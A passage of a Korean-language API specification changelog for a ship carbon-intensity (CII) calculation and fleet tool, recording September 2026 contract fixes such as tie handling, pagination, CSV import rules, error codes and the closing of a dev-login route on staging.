| 2026-09-08 | `#799` | **§5.1 `summary` 세 필드를 배열로 정정.** `lowest_cii_scenario` → `lowest_cii_scenarios` 등 복수형이며, **동률이면 전부 싣는다.** 종전에는 단수 문자열이라 동률에서 먼저 등장한 시나리오 하나만 실렸는데, **같은 값 중 하나만 지목하는 것은 그 자체가 추천**이라 같은 절의 「특정 시나리오를 추천하지 않는다」와 어긋났다. 동률은 드문 일이 아니라 정의상 필연인 경우가 있다 — `PRD §11.4.1` cubic speed model에서 연료는 거리에 비례하고 AER은 거리로 나누므로 **같은 속도의 직항과 우회는 `attained_cii`가 정확히 같다**(`#799` 실측: 둘 다 `4.982400`). 비교는 **응답에 실리는 자릿수**로 한다: 내부 `Decimal`은 30자리라 거리가 소거되는 두 시나리오도 끝자리가 갈리고, 그대로 비교하면 응답에 같은 값이 실려 있는데 동률이 아니라고 판정한다(`#739`·`#820`이 세운 「표시값으로 판정한다」 원칙) (#799) |
| 2026-09-11 | `#776` | **§1.9 `needs_recalc` 각주의 「화면은 이 플래그로 재계산 권고를 표시한다」를 정정.** 그런 화면은 존재한 적이 없고, `GET /calculations`는 화면에 연결하지 않는 것으로 재판정됐다(`#556` → `#776`). `PRD §8.4`의 「재계산 필요 표시」는 플래그를 세우는 처리이며 화면 표시를 규정하지 않는다. `AGENTS §4.3` 「오기 정정」이라 버전은 올리지 않는다. `§6.4` `reproduce`는 이번에 기능③ 화면에 연결됐다 — 계약은 바뀌지 않았다 (#776) |
| 2026-09-11 | `#753` | **§1.3 응답 계약 가드 각주 보강** — 대상이 「화면이 쓰는 16종」에서 **모든 라우트**로 넓어졌다(계약 표 · 조회 계약과 대조하는 쓰기 응답 · 파일 응답의 형식·헤더 행 · 사유 있는 면제). 종전 숫자(16종)는 낡아 뺐다. `AGENTS §4.3` 「각주 보강」이라 버전은 올리지 않는다 (#753) |
| 2026-09-11 | `#756` | **§6.1 예시의 거리 민감도 두 행을 구현과 맞춤**(`4.96`·`5.08` → 기준값 `5.02`) · 그 이유와 **`fuel_cf_alternative` 미구현 사실**을 예시 아래 각주로 적었다. 거리 지렛대는 연료를 함께 움직여 CII가 거의 변하지 않는다(`PRD §12.6` 각주). `AGENTS §4.3` 「값 정정」이라 버전은 올리지 않는다 (#756) |
| 2026-09-11 | `#759` | **정본 드리프트 정정** — ⑴ §3.1 `[ORACLE-MISS-3]`의 「대시보드는 클라이언트에서 다중 선박 조회 후 병합한다」 → `§2.8` `GET /fleet/summary`(`#350`) ⑵ §2.5 「완전 삭제는 관리자 권한 필요」 → `§1.2` 「권한 분리 없음」과 모순이라 정정 ⑶ 마침표 오기(`。`) 2곳. `AGENTS §4.3` 「오기·값 정정·각주 보강」이라 버전은 올리지 않는다 (#759) |
| 2026-09-11 | `#830` | **정본↔구현 정합 정정** — ⑴ §6.1 `simulation_runs` 「1000~10000」 → **1000 이상 · 10000 초과는 잘라 실행하고 `SIMULATION_RUNS_CLAMPED`**(`PRD §12.8`). 요청 스키마가 `le=10000`으로 먼저 422를 내 §1.6 경고 표가 규정한 경고가 **HTTP로 도달할 수 없었다** — 코드를 `PRD`에 맞췄고 §1.6 조건도 「상한 초과」로 좁혔다(하한 미만은 422). 같은 행의 필수 표기도 기본값 5000과 모순이라 N으로 ⑵ §1.2 「알고리즘은 `TECH_SPEC`이 확정한다」 → **Argon2id**(`TECH_SPEC`에 그 규정이 없었다) · 코드에만 있던 **비밀번호 규칙(10~128자)·세션 유효기간(7일)** 행 신설 — `auth/session.py`가 이 절을 가리키는데 절에 값이 없었다 ⑶ §1.10 `meta.is_simulated` → `meta.simulated`(§2.14·코드와 통일) ⑷ §2.9 「`meta.fuel_types`는 계속 싣는다」 → 이미 뺐다(`#444`) ⑸ §2.7 예시에 `transport_capacity_basis` ⑹ §3.5 응답이 **항차 객체 전체**임을 명시 ⑺ §5.1 `current_lat/lon` 「Y」 → 조건부(스키마는 처음부터 선택) ⑻ §5.2 예시에 `invalidated_calculation_runs` ⑼ §7.5 미구현 배너(§9와 같은 표기) ⑽ §12 파라미터 Import 추적처 `#444`(닫힘) → `#673`. `AGENTS §4.3` 「오기·값 정정·각주 보강·소규모 행 추가」라 버전은 올리지 않는다 (#830) |
| 2026-09-11 | `#833` | §1.4·§6.4에 409 `MODEL_VERSION_MISMATCH` · §1.6에 `MODEL_VERSION_DIFFERS` · §6.4 응답에 `model_version` 판정 각주. 종전에는 재현이 `model_version`을 보지 않아 NumPy 업그레이드 뒤의 결과 차이가 500 `REPRODUCIBILITY_ERROR`(계산 결함)로 나갔다. 판정 표는 `TECH_SPEC §10.3`. `AGENTS §4.3`상 소규모 행 추가·각주라 버전은 올리지 않는다 (#833) |
| 2026-09-11 | `#808` | **§1.2 「가입 제한」 행 신설 · 가입 엔드포인트 설명에 `invite_code`·가입 제한 확인 추가.** 사내 도구로 확정(2026-09-11)되어 가입을 허용 도메인(`SIGNUP_ALLOWED_DOMAINS`) 또는 초대 코드(`SIGNUP_INVITE_CODE`)로 제한한다. 거절은 기존 `422 VALIDATION_ERROR`로 낸다 — `403`은 §1.4에서 CSRF 전용이라 쓰지 않는다. 프로덕션에서 두 설정이 모두 비면 기동을 거부한다(`#809`·`#524`와 같은 기동 시점 가드). 행 추가라 버전은 올리지 않는다 (#808) |
| 2026-09-11 | `#982` | **v1.26 — §2.15 샘플 선박 목록 조회 신설**(`GET /vessels/samples`) · 엔드포인트 색인 행 추가. 선박 등록 화면이 제원을 채우는 출발점이다(`PRD §5.1` 「샘플 선박 선택」 복원). 값은 데모 시드의 합성 샘플 3척이며 `sample_id`는 선박 UUID가 아니다 — 데모 선박의 id를 실으면 화면이 상세 링크로 오인할 수 있다. 수치는 CRUD 층이라 JSON 숫자(§1.7). 절 신설이라 `AGENTS §4.3`에 따라 버전을 올린다 (#982) |
| 2026-09-11 | `#891` | **§8.1 파라미터 표에 `calculation_run_id` 행 추가** — `type=calculations`에서 계산 한 건만 내보낸다(기능① 「CSV 다운로드」 · `PRD §10.5`). 화면이 CSV를 따로 만들지 않고 서버의 수식 주입 방어·BOM·CRLF를 그대로 쓰기 위해서다. 다른 `type`과 함께면 422, 다른 선박의 계산이면 404. 행 추가라 버전은 올리지 않는다 (#891) |
| 2026-09-11 | `#772` | **§2.8 `vessels[]` 페이지네이션 · 서버 정렬** — 쿼리 `sort`(`risk`·`grade`·`name`) · `limit`·`cursor`(`§1.5`) 행, `meta.next_cursor`·`has_more`, 「`vessels[]`만 자르고 `summary`·`actions`는 선대 전체」 각주. 2026-09-11 결정 3-⑤. 종전 200척 상한(**조용한 절단**)을 없앴고, 다음 페이지는 첫 페이지의 `as_of`로 묻는다. 정렬 규칙은 화면(`fleetRules.sortVessels`)에서 서버로 옮겼다 — 페이지로 자르면 화면이 전체를 정렬할 수 없다. 행·각주 추가라 버전은 올리지 않는다 (#772) |
| 2026-09-11 | `#817` | **§4.1 요청에 `voyage_id`(선택) 행 추가 · §8.1 CII 열 근거 1 정정.** 결정 2-③ 「항차 컨텍스트가 있는 요청만 귀속, 기존 NULL 행은 포기」. 종전에는 계산 이력을 만드는 세 자리가 모두 `voyage_id`를 NULL로 넣어 **항차 단위 무효화가 항상 0행**이었다(`scenario_adopt`의 `invalidated_calculation_runs`도 늘 0). 항차를 밝힌 기능① 계산만 귀속하고(결과·`input_hash` 무영향), 기능① 「계획 저장」이 만든 항차에 한 번 더 기록한다. 과거 NULL 행은 `calc_run_guard()`(024)가 `needs_recalc` 외 UPDATE를 막아 채우지 않는다. §8.1의 「항상 NULL」 근거는 사라졌지만 「항차 하나의 CII는 정본의 양이 아니다」가 남아 열은 여전히 두지 않는다. 행 추가·정정이라 버전은 올리지 않는다 (#817) |
| 2026-09-11 | `#992` | **§1.9 `needs_recalc` 각주 교체** — 「이 플래그를 표시하는 화면은 없다」(`#776` 정정)를 「선박 상세의 계산 이력이 표시한다」로. 결정 3-② 「범위 밖은 없다」로 `#776`의 「화면에 연결하지 않는다」 판정이 뒤집혀, 선박 상세에 계산 이력(최신 20건 · 재계산 필요 배지)을 두고 기능③ 결과에 「이 실행에 쓴 항차」(§6.3)를 펼쳐 보이게 했다. 두 엔드포인트의 계약은 바뀌지 않았다. 각주 교체라 버전은 올리지 않는다 (#992) |
| 2026-09-12 | `#900` | **§1.3.2 언어 규정에 Pydantic 422 각주 추가** — 규정은 있었으나 Pydantic 검증 실패가 영문 원문·필드명 원문을 그대로 냈다(실측: 가입 `display_name` 200자 → `String should have at most 100 characters` · `field_label` `display_name`). 서버가 오류 `type`에서 한국어 문장을 만들고(§11 VAL-001·002 틀 · 받침 조사), 모르는 `type`은 한국어 폴백으로, 전 엔드포인트 요청 필드 96개에 한글 라벨을 둔다(종전 등록 12개). 결정은 `#900` 선택지 A(서버 한국어화). 각주라 버전은 올리지 않는다 (#900) |
| 2026-09-12 | `#999` | **§1.3.2 언어 규정에 서비스 문구 각주 추가** — 서비스가 직접 던지는 오류 문구 31곳(필드명 원문 16 · 계산 엔진 영문 예외 끼워 넣기 15)을 한국어로 옮겼다. **용량 축(DWT·GT)이 비어 기준선·등급 경계를 고르지 못한 경우를 409에서 422 `VALIDATION_ERROR`로 바로잡았다** — 사용자가 제원을 채우면 풀리는 원인이다. 각주라 버전은 올리지 않는다 (#999) |
| 2026-09-12 | `#906` | **§8.2에 선택 컬럼 `planned_departure_at`·`planned_arrival_at`(시간대 필수 · UTC 저장)과 응답 `missing_departure_count` 추가** — 가져온 항차가 늘 시각이 비어 진행 중 누적에 0으로 기여하던 결함(`#873`의 CSV 축). 선택 컬럼으로 둔 이유와 시간대를 요구하는 이유를 각주로 적었다. 결정은 이슈 권장안(선택 컬럼 + 결과 화면 안내). 행·각주 추가라 버전은 올리지 않는다 (#906) |
| 2026-09-12 | `#902` | **§1.4에 `INVALID_CREDENTIALS`(401) 추가 · §1.2 각주** — 로그인 실패와 비밀번호 변경의 현재 비밀번호 오입력이 세션 만료와 같은 `UNAUTHORIZED`를 써서 정의(「세션 없음·만료·무효」)와 어긋났다. 코드만 가르고 상태는 401 그대로다. 비밀번호 변경은 `details[].field` = `current_password`로 칸을 짚는다. 결정은 이슈 권장안 A(로그인 실패에도 적용 — 없는 이메일·틀린 비밀번호가 같은 코드라 계정 존재 여부가 드러나지 않는다). 행·각주 추가라 버전은 올리지 않는다 (#902) |
| 2026-09-12 | `#760` | **v1.27 — §3.8 샘플 항만 목록 조회 · §3.9 좌표 기반 추정 거리 신설** · 엔드포인트 색인 2행. `PRD §15.1` 「샘플 항만 테이블」 MUST가 없어 항차 입력에서 좌표를 사람이 직접 넣어야 했다. 값은 NGA World Port Index(공개 영역) 2026-09-12 조회분 43곳(데모 항로 9곳 전부 포함). 추정 거리는 기능②와 같은 대권거리 함수이며 실제 항로보다 짧다는 사실을 각주로 적었다. 절 신설이라 `AGENTS §4.3`에 따라 버전을 올린다 (#760) |
| 2026-09-12 | `#767` | **§9 판정 교체 — 조회(`§9.1`)를 열고 수동 갱신(`§9.2`)은 열지 않는다.** `#591`이 둘 다 유예한 이유(「누가 부를 수 있는지가 어드민 범위에 걸린다」)가 `#808`의 「사내 도구 · 로그인 사용자 공유」 확정으로 사라졌다 — 역할 구분이 없어 경계는 「로그인했는가」 하나이고 `auth_middleware`가 이미 건다. 조회는 부작용이 없고 「이 계산의 보정 계수가 왜 그 값인가」를 설명하는 유일한 창이다. 갱신은 **사용자가 외부 API 호출을 직접 일으키는 유일한 경로**가 되는데, 기상은 계산 요청이 fallback 체인에서 알아서 갱신하므로 없어도 성립한다. `§9.2`의 명세는 **지웠다** — 「미구현」으로 남기면 다음 사람이 「아직 안 만든 것」으로 읽고 만든다. 되살릴 조건(사용자 눈에 보이는 지연 · 운영자의 강제 재조회 필요)을 각주로 남겼다. `§12` 두 행도 함께 고쳤다. 절 신설이 아니라 판정 교체라 버전은 올리지 않는다 (#767) |
| 2026-09-12 | `#768` | **§3.10 「항만명 좌표 조회」 신설** · §12 행 추가. `PRD §15.1`의 `MAY`를 구현했다 — `#760`이 샘플 43곳을 넣어 **목록에 있는 항은 이미 좌표가 붙고**, 남은 것은 목록 밖 항만이었다(`PRD §1 COR-5`가 「개발자도구로 좌표를 찾는」 상태를 결함으로 적었다). **사용 정책이 설계를 정했다** — 공개 Nominatim은 **자동완성을 금지**하고 초당 1회를 상한으로 두며 **결과 캐시를 요구**한다. 그래서 입력 중이 아니라 「좌표 찾기」를 눌렀을 때 한 번 부르고, 결과를 `port_geocode`에 담는다. 찾지 못하는 세 경우(항만이 아님 · 조회 실패 · 조회 불가 환경)를 문구로 가르되 **어느 쪽이든 항차 입력을 막지 않는다.** 절 신설이라 버전을 올린다 (#768) |
| 2026-09-12 | `#765` | **§8.2에 `type=not_underway_periods` 신설.** `§2.9` 각주가 「CSV 가져오기는 항차만 다룬다」고 적어 둔 자리다 — 정박 연료는 CII의 **분자**에 들어가는데(`MEPC.412(84) §4.2`) 넣는 길이 한 건씩 누르는 화면뿐이라 실무에서 **안 넣게 된다**(그 결과가 「정박해도 등급이 안 떨어지는」 상태다). 부분 성공·행 상한·인코딩 규약은 `voyages`와 같고, **시간대가 겹치는 구간은 그 행만 거부**한다(겹치면 같은 연료가 두 번 세어진다). ⚠️ `dry_run`은 겹침을 보지 않으므로 응답이 `overlap_checked: false`로 그 사실을 말한다. `§4.3`상 표 확장·절 추가라 버전은 올리지 않는다 — 엔드포인트가 늘지 않았다 (#765) |
| 2026-09-12 | `#764` | §2.6에 **위치 이력 각주** 추가. 이 경로가 `vessel_position_snapshot`(`DB_SCHEMA §2.21`)에 `source=MANUAL` 행을 함께 남긴다 — `vessel.current_lat/lon`은 덮어쓰는 한 칸이라 직전 값이 사라졌고, 자동 수집(AIS)을 그 위에 올리면 **수집할수록 잃는 것이 늘어난다.** **응답 계약은 바뀌지 않는다.** 자동 수집은 이 엔드포인트를 쓰지 않는다 — 같은 절의 「조회 경로에서 갱신하지 않는다」와 같은 이유로 별도 배치다. `§4.3`상 각주 보강이라 버전은 올리지 않는다 (#764) |
| 2026-09-13 | `#120` | **§13.2에 `chat` 버킷 행 신설**(분당 10). 계산 버킷(60)을 함께 쓰지 않는 이유가 둘이다 — ⑴ 사람이 채팅을 치는 속도로 분당 10이면 넉넉하고 **분당 60은 사람이 낼 수 없는 속도**다 ⑵ ⚠️ **챗봇은 호출마다 외부 LLM 비용이 붙는다** — 다른 API는 초과 호출이 서버 부하로 끝나지만 챗봇은 **금액**으로 끝난다. `PRD §16.1`의 쿼리당 상한이 「한 번」을, 이 행이 **시간당 총액**을 막는다. 세 버킷 → 네 버킷 표현도 함께 고쳤다. `§4.3`상 행 추가라 버전은 올리지 않는다 (#120) |
| 2026-09-12 | `#763` | **§2.8 `vessels[].route` 신설** — 지도가 대권선을 그리는 근거다(`UIFLOW 2-4`). 진행 중 항차의 출발·도착 좌표 넷이 **모두 있을 때만** 싣는다: 반쪽 선분을 그리면 배가 어디로 가는지 잘못 말하고 화면은 그 사실을 알 수 없다. 선박마다 묻지 않고 **선대 전체를 쿼리 한 번**으로 조회한다 — 이 엔드포인트는 쿼리 수를 방금 줄여 놓은 자리다(`#989`). 고르는 규칙은 `§2.14`와 같게 두었다(실제 출항 시각 내림차순). `§4.3`상 응답 행 추가라 버전은 올리지 않는다 — 엔드포인트가 늘지 않았다 (#763) |
| 2026-09-12 | `#769` | **§2.7 연도 행에 `fuels[]` 신설 — `PRD §21` 「통계 분석」의 연료축.** 세 축 중 **연료축만** 열었다. 선박축은 이 엔드포인트가 연도로 이미 열고 있고, **항로축은 항만명이 자유 텍스트라 집계가 성립하지 않는다**(`BUSAN`·`Busan`·`부산`이 서로 다른 항로가 된다). 화면을 새로 만들지 않은 것은 `AGENTS §3.2.3`상 화면 신설이 `PRD §5` 판정을 선행 요구하기 때문이고, **추세는 연도 축이 이미 만들고 있어** 연료 내역을 그 행 안에 두면 축이 하나 더 생기지 않는다. ⚠️ **비중은 CO₂ 기준이다** — 톤 기준으로 적으면 CF가 낮은 연료를 많이 쓴 해가 실제보다 나빠 보인다(HFO 300t + LNG 100t → 톤 75.0% vs CO₂ 77.3%). 거리가 0이라 Layer 1을 타지 않은 해도 **행은 남기고** CO₂만 `null`로 둔다 — 비우면 「정박만 한 해」가 연료축에서 사라진다. `§4.3`상 기존 응답의 행 추가라 버전은 올리지 않는다 — 엔드포인트가 늘지 않았다 (#769) |
| 2026-09-13 | `#121` | **§15 Chat API 신설**(`POST /api/v1/chat`) + §1.4에 `503 CHAT_UNAVAILABLE` 행 + §12 요약표 행. 절 번호를 **15로 뒤에 붙인 이유**는 §11~§14가 요약·정정 절이라, API 계열을 그 앞에 끼우면 네 절과 그것을 가리키는 상위 문서 참조가 전부 밀리기 때문이다. ⚠️ **스트리밍(SSE)을 쓰지 않는다**(`§15.5`) — `§15.2` 수학 검증은 **답 전체를 봐야** 판정하는데, 토큰을 흘려보내면 이미 뜬 문장을 거둬들여야 하고 그것은 「버린다」가 아니라 「보여 줬다가 지운다」다. 응답을 버리는 세 경우를 `discarded`로 드러내되 **200을 낸다** — 버리는 것은 사용자 잘못이 아니라 모델의 답이 규율을 어긴 것이고, 4xx를 내면 화면이 고칠 수 없는 입력을 고치라고 안내하게 된다. `§4.3`상 절 신설이라 **v1.28 → v1.29** (#121) |
| 2026-09-13 | `#756` | §6.1 거리 민감도 각주 정정 — 「거의 변하지 않는다」를 **「잔여 계획의 배출 강도가 확정 실적과 같으면 정확히 변하지 않는다」**로 고쳤다. 종전 문구는 조건부 사실을 무조건으로 적어, 실적이 계획에서 벌어져 그 행이 실제로 움직이는 경우를 설명하지 못했다(`PRD §12.6` 각주와 함께 정정). `AGENTS §4.3` 「각주 정정」이라 버전은 올리지 않는다 (#756) |
| 2026-09-13 | `#363` | **§6.1 요청에 `apply_feedback_factor` · 응답 예시에 `feedback` 블록 · §6.1.2 신설 · §1.6에 `FEEDBACK_FACTOR_UNAVAILABLE`.** `PRD §12.2.1` 실적 보정계수를 그대로 낸다. **켜지 않아도 계수를 싣는다** — 켜기 전에 판단할 수 있어야 한다. 표본이 모자라면 `factor`를 `1`로 채우지 않고 `null`로 둔다(「계획대로 쓰고 있다」와 구분). 켠 사실은 `input_hash`에 켰을 때만 들어가 기존 실행의 해시가 바뀌지 않는다. `AGENTS §4.3`상 소규모 행 추가·소절 신설이라 버전은 올리지 않는다 (#363) |
| 2026-09-13 | `#513` | **v1.30 — §2.16 데이터 점검 신설** · §12 요약표 1행. `UIFLOW 2-11`의 본체로 **실측이 아닌 값이 들어간 항차**를 네 심각도(대체 계산 · 계산 불가 · 이상치 · 실적 미입력)로 낸다(`PRD §17.4`). 계산 불가 어휘는 `§2.8` `unavailable_reason`을 그대로 쓴다 — 대시보드와 다른 이름을 붙이면 같은 문제를 둘로 읽는다. **판정하지 못한 이상치 수를 따로 싣는다** — 0건과 섞으면 제원이 없는 선박이 가장 깨끗해 보인다. 집계에 진행 중 항차를 넣지 않아 누적 CII가 `§2.8`과 다를 수 있음을 적었다. 절 신설이라 `AGENTS §4.3`에 따라 버전을 올린다 (#513) |
| 2026-09-13 | `#513` | **v1.31 — §2.17 함대 감축 계획 신설**(계산 · 저장 · 목록 · 단건) · §12 요약표 4행 · §1.6에 `SLOWDOWN_SKIPPED_NO_SPEED_MODEL`. `UIFLOW 2-10`의 본체로 `PRD §12.3.2` 계산을 낸다. **단가는 요청의 가정값**이고 저장본에 함께 남는다 — 필요한 단가가 비면 비용 칸은 `null`(0으로 채우지 않는다). 저장은 **서버가 다시 계산**하며 단건 조회는 **저장 시점 결과를 그대로** 돌려준다. `before`가 `§6.1` 결정론 예상과 같다는 사실을 계약으로 적었다. 절 신설이라 `AGENTS §4.3`에 따라 버전을 올린다 (#513) |
| 2026-09-14 | `#1070` | **§2.17 요청 검증 4종을 계약으로 적었다** — ⑴ `plan_name`은 **앞뒤 공백을 걷고** 길이를 재 공백만 있으면 422(종전에는 검증을 통과해 선대 전체 계산을 한 번 돌린 뒤 DB 제약에 걸려 500) · ⑵ `prices.charter_usd_per_day` 키를 **UUID 표준 표기로 정규화**(대문자 키가 조회 키와 어긋나 단가를 넣고도 「단가 입력 필요」가 됐다) · ⑶ 같은 선박의 감속률이 두 번이면 422(받아 주면 계산은 마지막 값, 저장본에는 두 값이 남아 재현이 성립하지 않는다) · ⑷ `vessels[].remaining_voyage_count`를 **스냅샷의 PLAN 항차 수**로 통일하고 입력 조립의 경고를 `warnings`에 전달. ⑷의 기준은 새로 정한 것이 아니라 `#812`가 `§6.1`에 이미 세운 「빼되 조용히 빼지 않는다」를 같은 값에 적용한 것이다 — 종전에는 제외 **후** 개수를 실어 같은 선박·같은 연도인데 연간 등급 관리 화면과 항차 수가 달랐다. `AGENTS §4.3`상 **소규모 행 추가·검증 규칙 명시**라 버전은 올리지 않는다 (#1070) |
| 2026-09-14 | `#1084` | **§6.1·§6.4 오류 표에 `CALCULATION_ERROR`(422) 행 추가.** 확정 실적도 거리 있는 잔여 계획도 없는 선박(`completed_W + planned_W = 0` · `PRD §12.8`)에서 기능③이 **500 `INTERNAL_ERROR`** 로 끝났다 — 엔진의 `ValueError`를 서비스가 도메인 오류로 옮기지 않아 catch-all이 받았다. **서버가 고장 난 것이 아니라 항차를 등록하면 풀리는 상태**인데 화면이 그렇게 안내할 자리가 없었다. 같은 엔진을 부르는 실시간 CII ⑶(`services/cii_current.py:354`)은 이미 이 예외를 받아 사유(`NO_BASIS`)를 싣는다 — ⑶은 **조회** 응답의 한 갈래라 사유로 내려가고, 기능③은 **실행 요청**이라 422가 맞는 층위다(`TECH_SPEC §12.1` 「입력이 만든 상태」). 실행과 재현 두 경로가 같은 문구를 쓰도록 변환을 한 함수(`_project_or_domain_error`)에 두었다 — 두 화면이 같은 상태를 다르게 설명하면 사용자는 서로 다른 문제를 만났다고 읽는다. `AGENTS §4.3`상 오류 표 행 추가라 버전은 올리지 않는다 (#1084) |
| 2026-09-14 | `#1085` | **§2.8 `warnings` 절에 `EXCLUDE` 진행 항차 규정 추가.** 「연간 반영 안 함」으로 둔 **진행 중** 항차가 YTD·구간값·선대 요약·이력·연간 리포트에 더해지고 있었다 — 확정분은 `list_annual_inclusions`가 정책으로 거르는데 진행분은 `find_in_progress`가 **상태로만** 골라(`db/repositories/voyage.py:278-301`) 정책을 보지 않았고, `PRD §8.1.2`상 `IN_PROGRESS + EXCLUDE`가 합법 조합이라 데이터 오류로도 걸러지지 않았다. 결과는 **항해 중에는 누적이 늘다가 `COMPLETED + EXCLUDE`로 넘어가는 순간 집계에서 빠져 누적 CII가 한 번에 뛰는 것**이었다. `PRD §3.3.8`의 집계 범위 표는 이미 `EXCLUDE`를 「넣지 않는다」로 정하고 있었으므로 **정본을 바꾼 것이 아니라 코드를 정본에 맞춘 것**이고, 이 절에는 그 사실을 적었다. ⚠️ **경고도 함께 비운다** — 세 경고 문구가 「누적에 반영되지 않았습니다 … 입력해 주세요」 꼴이라 반영하지 않기로 한 항차에 띄우면 거짓 안내가 된다. **⑵ 항차 구간값은 그대로 낸다** — `§3.3.8`의 3종 표에서 ⑵는 ⑴과 별개 값이고 집계 범위 표는 ⑴에만 걸린다. `AGENTS §4.3`상 각주 보강이라 버전은 올리지 않는다 (#1085) |
| 2026-09-15 | `#1075` | **§13.3 CORS 허용 Header에서 `X-API-Key`를 뺐다** — `#104`가 API Key 인증을 세션 쿠키 인증으로 대체(슈퍼시드)해 `§1.2`에 API Key가 정의돼 있지 않고 서버가 그 헤더를 읽지 않는데, 허용 목록에만 남아 있었다. `#104` 닫는 코멘트가 잔존물로 기록한 두 자리(이 행 · `voyage-cii/apiProvider.ts`) 가운데 프론트 쪽은 provider 4개의 `apiKey` 옵션과 `providerSelection` 4개의 `VITE_API_KEY` 읽기를 함께 걷었다. `AGENTS §4.3`상 값 정정이라 버전은 올리지 않는다 (#1075) |
| 2026-09-15 | `#1058` | **v1.33 — §1.2 스텁 인증 등록 조건을 「`APP_ENV != production`」에서 「`development`·`test`에서만」으로 좁혔다.** 종전 조건은 허용값 넷 중 셋에서 `POST /auth/dev-login`을 열었고, `#524`가 `APP_ENV=production` + `MAIL_BACKEND=console`을 기동 실패로 막기 때문에 **SMTP가 준비되기 전 배포는 `staging`을 고르는 것이 정상 경로**다(`docs/OPERATIONS.md §4.5`). 2026-09-15 OCI 배포(app-01:8001, Security List `0.0.0.0/0`)에서 그 경로가 실제로 200을 냈다 — **누구나 미인증 세션을 받을 수 있었다.** 판정을 부정형에서 **여는 목록**(`_DEV_SURFACE_ENVS`)으로 뒤집어, 모르는 값·새 환경이 늘 때 **닫는 쪽으로** 틀리게 했다(`#810`이 `should_register_dev_auth()`의 부정형을 없앤 것과 같은 판단). `/docs`·`/redoc`·`/openapi.json`과 시연 계정 시드도 같은 판정을 쓴다. `staging`이 허용값에 남는 이유는 그대로다 — 메일 백엔드(`#524`)·`APP_PUBLIC_URL`(`#809`)·가입 게이트(`#808`) 가드가 프로덕션 전용이라 SMTP 없이 배포를 검증하는 자리가 필요하고, 이 변경은 그 자리를 **닫힌 채로** 만든다. 규칙 변경이라 `AGENTS §4.3`에 따라 판본을 올린다 (#1058) |
| 2026-09-18 | `#1072` | **§5.2 응답 `updated_fields`에 `planned_fuel_ton` 추가** · `updated_fields` 필드 설명표와 「계획 연료도 포함한다」 절 신설. `UPDATE_EXISTING_PLAN`이 거리·속력·도착시각만 바꾸고 **계획 연료를 그대로 두었다** — `CREATE_NEW_VOYAGE`는 `scenario.fuel_ton`을 쓰고 `source: MODEL_ESTIMATE`까지 남기므로 **같은 시나리오인데 채택 방식에 따라 연간 예상 결과가 갈렸다.** 우회(거리↑) 시나리오는 「새 거리 + 옛 연료」가 되어 CII가 실제보다 **좋게**, 감속(연료↓)은 **나쁘게** 나왔다. 화면이 도달하는 채택 경로는 `UPDATE_EXISTING_PLAN` 하나뿐이라(`UIFLOW 2-2` · `#580`) 그쪽이 틀린 쪽이었고, 화면이 보여 준 개선이 사용자 데이터에서 재현되지 않는 자리다(`PRD §2.3` 「계산 가능성」). **결정은 「가 — 연료도 갱신」**이며 사용자 회신(결정요청 v9 군 B 권장안 · 2026-09-17)이다 — 제품이 이미 한쪽에서 옳게 하고 있어 **두 경로를 같게 맞추는 것이지 새 규칙이 아니다.** 유종이 여럿이면 **기존 비중대로 안분**한다(시나리오 행에 연료 종류가 없다 — `DB_SCHEMA §2.4`는 양만 갖는다). 비중을 유지하면 채택 전후로 CF 혼합이 바뀌지 않아 CO₂ 차이가 **오직 연료량에서만** 나온다. 4자리 반올림 잔차는 비중이 가장 큰 행이 흡수해 합이 총량과 정확히 같다. ⚠️ **비중이 없는 행은 건드리지 않는다** — `chk_fuel_positive`(046)가 `NULL 아니면 > 0`을 요구하므로 0으로 덮으면 채택이 500이 된다. 연료 행이 아예 없는 항차는 `CREATE_NEW_VOYAGE`와 같은 규칙(원본 항차 유종 → 선박 기본 연료)으로 한 행을 만든다(`#1095` ⑵가 그 상태를 실제로 확인했다). **과거 채택분은 소급 수정하지 않는다** — 저장된 계산을 건드리지 않는 것이 이 제품의 규율이고(`TECH_SPEC §5.4` immutable) 재계산 필요 표시는 이미 붙는다. ⚠️ **연료 종류를 알 수 없으면**(원본 항차에 연료 행이 없고 선박 기본 연료도 없다) 연료만 건너뛰고 `updated_fields`에서 그 필드를 뺀다 — 그 때문에 계획값 갱신 전체를 거부하면 사용자가 하려던 일이 막히고, 바꾸지 않은 것을 바꿨다고 적으면 거짓이 된다. 처음에는 오류로 두었다가 **`#1077`의 무효화 건수 검사 2건이 전체 시험에서 깨져** 고쳤다(그 검사들은 연료와 무관한데 픽스처가 바로 그 상태였다). `AGENTS §4.3`상 **응답 배열에 값 하나 추가**라 버전은 올리지 않는다 — 엔드포인트가 늘지 않았다(`#1076` 선례) (#1072) |
| 2026-09-18 | `#816` | **§6.1 `as_of` 요청 행·예시 등재 · `meta.as_of` · `parameters_used` v2 각주.** `as_of`가 배선만 있고 집계에 쓰이지 않아 **다른 `as_of`가 같은 결과**를 냈다. 결정(결정요청 v9 회신 「가」=A안): ⑴ `_collect_voyages`가 절단을 저장소까지 넘기되 **확정은 도착 ≤ `as_of` · 잔여는 도착 예정 > `as_of`** 의 상보 집합으로 방향을 가른다 — 같은 절단을 잔여에 그대로 쓰면 잔여 계획이 전멸해 `PRD §12`의 연말 예상이 무너진다(착수 중 실측). **명시 실행에만** 해시 키를 넣어 기존 실행의 `input_hash`는 무변경(`apply_feedback_factor`의 두 번째 적용례). `annual_simulation_run.as_of`(마이그레이션 052)이 재현의 원본 시각을 재생한다. ⑶ `fuel_types`·`parameter_sources`(4키)를 담은 **v2 빌더** 신설 — v1은 동결해 옛 해시를 그대로 재생한다. `AGENTS §4.3`상 행·각주 추가라 버전은 올리지 않는다 (#816) |
| 2026-09-17 | `#1190` | **v1.34 — §8.2 「부분 성공의 범위」 소절 신설.** 같은 엔드포인트의 두 갈래가 다르게 동작했다 — 정박 구간은 행 단위로 떨어뜨려 **부분 성공**을 냈는데 항차는 저장 단계 실패가 **500**이 됐고, `create_voyage`가 행마다 커밋하므로 **앞 행은 저장된 채 남았다.** 사용자는 500을 「아무것도 안 들어갔다」로 읽고 다시 올려 같은 항차를 두 벌 만들었다(`voyage_no`에 유니크 인덱스가 없다). 원인은 두 겹이었다 — ⑴ 파서가 숫자 세 열 모두 `DISTANCE` 한도 하나를 써서 `planned_speed_kn`의 `NUMERIC(6,2)`를 넘는 `10000`이 통과했고(수기 API는 `Field(**SPEED)`로 막는다 — **경로마다 한도가 갈려 있었다**), ⑵ 항차 저장 루프에 행 단위 `try/except`가 없었다. `except AppError`만으로는 부족한 것도 함께 정리했다 — `ProgrammingError(-494)`는 `AppError`가 아니고 `db/cubrid_errors.py`가 `IntegrityError`로 